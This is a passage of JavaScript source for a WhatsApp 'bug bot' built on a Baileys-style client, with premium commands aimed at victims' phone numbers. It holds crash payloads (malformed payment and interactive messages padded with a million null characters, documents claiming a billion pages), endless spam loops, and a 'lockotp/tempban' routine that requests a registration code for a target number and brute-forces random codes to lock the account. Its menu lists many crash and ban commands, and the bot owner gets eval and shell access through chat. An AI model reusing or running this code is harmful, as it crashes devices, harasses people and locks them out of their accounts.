													'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"#BIL MD CRASH ☠️🔥","key":"+923444844060","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				for (let i = `3`; i !== 0; i -= 1) {
					await GlobalTechInc.relayMessage(
						jid,
						{
							viewOnceMessage: {
								message: {
									interactiveMessage: {
										header: {
											title: '',
											subtitle: ' ',
										},
										body: {
											text: '#BIL MD CRASH ☠️🔥',
										},
										footer: {
											text: 'xp',
										},
										nativeFlowMessage: {
											buttons: [
												{
													name: 'cta_url',
													buttonParamsJson:
														"{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }",
												},
											],
											messageParamsJson: '\0'.repeat(1000000),
										},
									},
								},
							},
						},
						{ participant: { jid: jid } }
					);
					}
				}
await replyglobal(`In process....`)
            await xeonIosShot(whatsappNumber);
            sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
            }
            
				break;
				case 'xpayment': {
					if (!isPremium) return replyglobal(mess.prem)
if (!text) return replyglobal(`Usage .${command} 923444844060`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replyglobal(`Example : ${prefix+command} 923444844060`)
var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "923444844060") {
    return;
    }
    if (cleanedNumber == "923051391007") {
    return;
    }
    if (cleanedNumber == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp");
  }
  async function xeonBugPay(jid){
				await GlobalTechInc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+923444844060","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				await xeonBugPay(whatsappNumber);
            sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
				}
				break;
		case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
if (!isPremium) return replyglobal(mess.prem)
if (!q) return replyglobal(`Usage .${command} 923444844060`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replyglobal(`Example : .${command} 923444844060`)
let target = xeonyvictim + '@s.whatsapp.net'
await replyglobal(`In process....`)
for (let j = 0; j < 1; j++) {
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
}
await replyglobal(`Successfully Send Bug to ${xeonyvictim} Using ${command}. ✅`)
}
break
case 'ioskill': case 'iosx': {
            	if (!isPremium) return replyglobal(mess.prem)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replyglobal(`Example : .${command} 923444844060`)
await replyglobal(`In process....`)
let target = xeonyvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
case 'xfreeze': case 'xblankscrn': {
	if (!isPremium) return replyglobal(mess.prem)
	const XeonDoc = {
    url: "./80/x.mp3"
};
async function xeonFreeze(jid){
	  for (let i = 0; i < 50; i++) {
await GlobalTechInc.sendMessage(jid, {
    'document': XeonDoc,
    'fileName': "🦄드림 가이 Xeon" + xeontext1,
    'mimetype': "application/zip",
    'caption': "🦄드림 가이 Xeon" + xeontext1,
    'pageCount': 0x3b9aca00,
    'contactVcard': true
});
}
}

await xeonFreeze(m.chat);
	}
	break
	case 'xkillgc': case 'xblankscrn': case 'xwebgc': {
		if (!isPremium) return replyglobal(mess.prem)
		const xeonimage = {
    title: "🦄드림 가이 Xeon; ",
    hasMediaAttachment: true,
    imageMessage: thumb.imageMessage
};

const xtext = {
    text: ''
};

GlobalTechInc.relayMessage(m.chat, {
    'viewOnceMessage': {
        'message': {
            'interactiveMessage': {
                'header': xeonimage,
                'body': xtext,
                'nativeFlowMessage': {
                    'buttons': [{
                        'name': "galaxy_message",
                        'buttonParamsJson': JSON.stringify({
                            'header': "🦄드림 가이 Xeon; ",
                            'body': "xxx",
                            'flow_action': "navigate",
                            'flow_action_payload': {
                                'screen': "FORM_SCREEN"
                            },
                            'flow_cta': "xxxxx",
                            'flow_id': "1169834181134583",
                            'flow_message_version': '3',
                            'flow_token': "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                        })
                    }],
                    'messageParamsJson': ''
                },
                'contextInfo': {
                    'isForwarded': true,
                    'fromMe': false,
                    'participant': "0@s.whatsapp.net",
                    'remoteJid': m.chat,
                    'quotedMessage': {
                        'documentMessage': {
                            'url': "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                            'mimetype': "application/pdf",
                            'title': "crash",
                            'pageCount': 0x3b9aca00,
                            'fileName': "crash.pdf",
                            'contactVcard': true
                        }
                    },
                    'forwardedNewsletterMessageInfo': {
                        'newsletterJid': "120363222395675670@newsletter",
                        'serverMessageId': 0x1,
                        'newsletterName': "🦄드림 가이 Xeon"
                    }
                }
            }
        }
    }
}, {});
		}
		break
		case 'xiosfreeze': case 'xioshot':{
			if (!isPremium) return replyglobal(mess.prem)
			const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Xeon's ur father`
}}
}
			async function XeonyCrashyIos(dgxeon, chat, participant) {
  GlobalTechInc.sendMessage(
    chat,
    {
      document: { url: "./settings.js" },
      mimetype: `image/null`,
      fileName: `🦄드림 가이 Xeon${xeontext11}`,
      caption: `🦄드림 가이 Xeon ${xeontext11}`,
    },
    { quoted: { ...subscribe_dgxeon, key: { ...subscribe_dgxeon.key, participant } } }  // Includes the quoted participant
  );
}
  async function executeIosAttack() {
    if (!args[0]) amount = `99`;
    for (let i = 1; i < 10; i++) {
      XeonyCrashyIos(pushname, m.chat, sender);  // Make sure to pass the participant here
      
    }
    }
            await executeIosAttack();
            }
    break;
case 'lockotp': case 'tempban': {
	if (!isPremium) return replyglobal(mess.prem)
  if (args.length < 1) return replyglobal(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 91|6909137213`);
  const args2 = args[0].split('|');
  if (args2.length !== 2) return replyglobal(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 91|6909137213`);
  const xeonCountryCode = args2[0];
  const xtarget = args2[1];
  const xeonNumber = xtarget.replace('@s.whatsapp.net', '');
  const xeonmerge = `${xeonCountryCode}${xtarget}`
  const xeonMention = xeonmerge + '@s.whatsapp.net';
  sendMessageWithMentions(
    "Successfully Activated OTP LOCK To @" + xeonMention.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [xeonMention]
  );
  try {
    const { stateXeon, saveCredsXeon } = await useMultiFileAuthState('./session');
    const xeonRequest = await GlobalTechInc.requestRegistrationCode({
      phoneNumber: '+' + xeonCountryCode + `${xeonNumber}`,
      phoneNumberCountryCode: xeonCountryCode,
      phoneNumberNationalNumber: `${xeonNumber}`,
      phoneNumberMobileCountryCode: 724,
      method: 'sms'
    });
  } catch (err) {
  }
  
  for (let i = 0; i < 10000; i++) {
    try {
      var xeonPrefix = Math.floor(Math.random() * 999);
      var xeonSuffix = Math.floor(Math.random() * 999);
      await GlobalTechInc.register(`${xeonPrefix}-${xeonSuffix}`);
    } catch (err) {
      console.log(`${xeonPrefix}-${xeonSuffix}`);
    }
  }
}
break;

case 'readviewonce': case 'rvo': {
	if (!m.quoted) return replyglobal(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replyglobal(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return GlobalTechInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return GlobalTechInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'clearchat':
xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
            case 'menu':
            case 'help':
            case 'alive':
            case '?':
            case 'allmenu':
                let xeonmenuoh = `Hello ${pushname}
╰┈➤ ${xeonytimewisher} 😄
${readmore}
╰┈➤ ʙᴜɢ ᴀɴᴅʀᴏɪᴅ
> xandroid 
> xandroid2
> systemuicrash
> xsysui
> xpayment
> oneshot
> onekill
> xfreeze

╰┈➤ ʙᴜɢ ᴡᴇʙ
> xfreeze
> xblankscrn
> xwebgc

╰┈➤ ʙᴜɢ ɪᴏꜱ
> xios
> xios2
> ioskill
> xiosfreeze
> xioshot

╰┈➤ ʙᴜɢ ᴏᴛʜᴇʀ
> tempban
> lockotp

╰┈➤ ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ
> webgc
> androgc
> iosgc
> xjpmgc

╰┈➤ ʙᴀɴ/ᴜɴʙᴀɴ ᴍᴇɴᴜ
> banv1
> banv2
> banv3
> banv4
> banv5
> banv6
> unbanv1
> unbanv2
> unbanv3
> unbanv4
> unbanv5

╰┈➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
> getsession
> deletesession
> join
> shutdown  
> restart
> autoread *[option]*
> autotyping *[option]*
> autorecording *[option]*
> autorecordtyp *[option]*
> autobio *[option]*
> autoswview *[option]*
> mode *[option]*
> block
> unblock 
> backup
> getcase
> addowner
> delowner

╰┈➤ ɢʀᴏᴜᴘ ᴍᴇɴᴜ
> closetime
> opentime
> kick
> add
> promote
> demote
> setdesc
> setppgc
> tagall
> hidetag
> totag
> group *[option]*
> editinfo
> linkgc
> revoke
> listonline

╰┈➤ ᴍᴀɪɴ ᴍᴇɴᴜ
> menu
> buypremium
> runtime
> script
> donate
> owner

╰┈➤ ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ
> sticker
> smeme
> take
> toimage
> tovideo
> toaudio
> tomp3
> tovn
> togif
> tourl
> toqr
> toviewonce
> fliptext
> emojimix

╰┈➤ ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ
> addvideo
> addimage
> addsticker
> addvn
> addzip
> addapk
> addpdf
> delvideo
> delimage
> delsticker
> delvn
> delzip
> delapk
> delpdf
> listvideo
> listimage
> liststicker
> listvn
> listzip
> listapk
> listpdf

╰┈➤ ᴅᴏᴡɴ ᴍᴇɴᴜ
> play
> ytmp3
> ytmp4
> sound1 - sound161`
if (typemenu === 'v1') {
                    GlobalTechInc.sendMessage(m.chat, {
                        text: xeonmenuoh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/hFFgCL2/qris.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    GlobalTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./GlobalMedia/thumb2.mp4'),
      gifPlayback: true,
      caption: xeonmenuoh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/1mr4Y16/anjay.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    GlobalTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./GlobalMedia/thumb2.mp4'),
                        caption: xeonmenuoh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    GlobalTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xeonmenuoh
                        }
                    }, {})
                }
                break
                case 'telestick': {
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await replyglobal(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await replyglobal('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				GlobalTechInc.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				GlobalTechInc.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else replyglobal(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replyglobal(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replyglobal(bang)
                    }
                    try {
                        replyglobal(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replyglobal(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replyglobal(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replyglobal(evaled)
                    } catch (err) {
                        await replyglobal(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replyglobal(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyglobal(err)
                        if (stdout) return replyglobal(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})
